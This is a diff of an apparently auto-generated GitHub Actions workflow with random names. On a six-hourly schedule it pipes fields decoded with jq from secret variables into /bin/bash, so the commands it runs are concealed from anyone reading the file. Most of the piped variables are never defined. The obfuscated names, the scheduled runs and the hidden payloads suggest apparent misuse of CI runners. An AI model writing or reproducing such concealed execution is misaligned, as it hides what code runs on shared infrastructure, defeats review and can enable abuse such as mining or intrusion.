@@ -1,10 +1,10 @@
 name: yuangandan3456
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 1/6 * * *'
-
-jobs:  # 6156
+    - cron: '22 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,20 +12,11 @@ jobs:  # 6156
       - uses: actions/checkout@v4
       - name: yuangandan3456
         env:
-          ayjki4: ${{ secrets.ayjki4 }}
+          vobj4: ${{ secrets.vobj4 }}
         run: |
-          echo $ayjki4 | jq -r .r4297 | /bin/bash
-          echo $cwmk98 | jq -r .nox839 | /bin/bash
-          echo $gc42 | jq -r .znmkt48945 | /bin/bash
-          echo $ovlfu2 | jq -r .xp8194 | /bin/bash
-          echo $ckys5 | jq -r .vh4 | /bin/bash
-          echo $mwdlg4193 | jq -r .obwk464 | /bin/bash
-          echo $ct6468 | jq -r .s80814 | /bin/bash
-          echo $t01 | jq -r .rbzfg160 | /bin/bash
-          echo $xddj27595 | jq -r .qauj9 | /bin/bash
-          echo $a9 | jq -r .nkf84 | /bin/bash
-          echo $fqrp9 | jq -r .tokq057 | /bin/bash
-          echo $oobyn51 | jq -r .flnb632 | /bin/bash
-          echo $q7171 | jq -r .gxmd41 | /bin/bash
-          echo $fecs14941 | jq -r .yz15 | /bin/bash
+          echo $vobj4 | jq -r .r67860 | /bin/bash
+          echo $caat07043 | jq -r .dq41 | /bin/bash
+          echo $pphvt4 | jq -r .vi4 | /bin/bash
+          echo $i3781 | jq -r .vzgtu7 | /bin/bash
+          echo $gcej24062 | jq -r .cyy0 | /bin/bash
 
